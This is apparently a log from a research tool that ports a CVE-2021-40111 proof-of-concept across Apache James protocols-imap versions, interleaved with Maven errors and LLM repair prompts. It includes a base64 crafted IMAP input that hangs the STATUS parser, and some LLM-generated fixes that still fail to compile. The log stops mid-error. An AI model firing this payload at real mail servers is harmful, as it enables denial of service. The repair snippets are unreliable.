[1m[Main] === Starting adaptation process for CVE-2021-40111 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/org_apache_james_protocols_protocols-imap.txt[0m
[96m[Analyzer] org.apache.james.protocols:protocols-imap has 22 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['1.6.3', '3.0.0-beta5', '3.0.0-RC1', '3.0.0', '3.0.1', '3.1.0', '3.2.0', '3.3.0', '3.4.0'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2021-40111[0m
[92m[Main] Total affected versions: 11[0m
[92m[Main] Already reproduced versions: 2[0m
[93m[Main] Versions pending adaptation: 9[0m
[96m[Main]     -> ['1.6.3', '3.0.0-beta5', '3.0.0-RC1', '3.0.0', '3.0.1', '3.1.0', '3.2.0', '3.3.0', '3.4.0'][0m
[96m[Main]     -> ['3.5.0', '3.6.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2021-40111/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'milliseconds'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 3.4.0[0m
[96m[Selector] Closest reproduced version: 3.5.0 at index 9[0m
[96m[Adapter] Trying next closest version: 3.4.0[0m
[96m[Preparer] Using exploit from origin: /PoCAdaptation/exploit/origin/CVE-2021-40111/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit[0m
[96m[Preparer] Updating dependency version to 3.4.0 in /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 3.4.0 in /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 3.4.0...[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 3.5.0 to 3.4.0...[0m
[96m[Adapter] Start adapting exploit from 3.5.0 to 3.4.0"[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.api[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.decode[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2394 (prompt), 1 (completion), 2395 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol
  symbol:   class Tag
  location: package org.apache.james.imap.api
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol
  symbol:   class DecodingException
  location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 7 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.199 s
[INFO] Finished at: 2025-07-11T11:45:47Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: package org.apache.james.imap.api
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 136 (prompt), 10 (completion), 146 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, package org.apache.james.imap.api 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.api.Tag; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.Tag;Tag
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 9, 'column': 33, 'message': 'cannot find symbol', 'symbol': 'class Tag', 'location': 'package org.apache.james.imap.api', 'code_line': 'import org.apache.james.imap.api.Tag;'} with cause: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[Adapter] Related diffs for error: [(4962, 8.0), (4990, 8.0), (4991, 8.0), (4997, 8.0), (4998, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Tag cause: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[RepairModule] Trying best diff #4962 with score 8.00[0m
[LLMClient] Tokens used: 1018 (prompt), 472 (completion), 1490 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Tag, location: package org.apache.james.imap.api

### Error Position:
import org.apache.james.imap.api.Tag;

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/ImapRequestLineReader.java, Hunk: @@ -28,24 +28,24 @@
 import java.nio.charset.CharsetDecoder;
 import java.nio.charset.CoderResult;
 import java.nio.charset.CodingErrorAction;
-import java.time.LocalDateTime;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;

 import javax.mail.Flags;

-import org.apache.commons.io.IOUtils;
 import org.apache.james.imap.api.ImapConstants;
+import org.apache.james.imap.api.display.CharsetUtil;
-import org.apache.james.imap.api.Tag;
 import org.apache.james.imap.api.display.HumanReadableText;
-import org.apache.james.imap.api.display.ModifiedUtf7;
 import org.apache.james.imap.api.message.IdRange;
 import org.apache.james.imap.api.message.UidRange;
 import org.apache.james.imap.api.message.request.DayMonthYear;
 import org.apache.james.imap.api.process.ImapSession;
 import org.apache.james.imap.api.process.SearchResUtil;
-import org.apache.james.imap.utils.FastByteArrayOutputStream;
 import org.apache.james.mailbox.MessageUid;
+import org.apache.james.protocols.imap.DecodingException;
+import org.apache.james.protocols.imap.utils.DecoderUtils;
+import org.apache.james.protocols.imap.utils.FastByteArrayOutputStream;

 /**
  * Wraps the client input reader with a bunch of convenience methods, allowing

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.api.Tag;
import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}


[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.protocols.imap.utils.DecoderUtils;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | class DecodingException', 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 40, Column: 14
  Message  : method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length
  Symbol   : None
  Location : None
  Code     : super.decode(request, tag, session);
  Position : after the fixing line (9)[0m
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1827 (prompt), 1 (completion), 1828 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
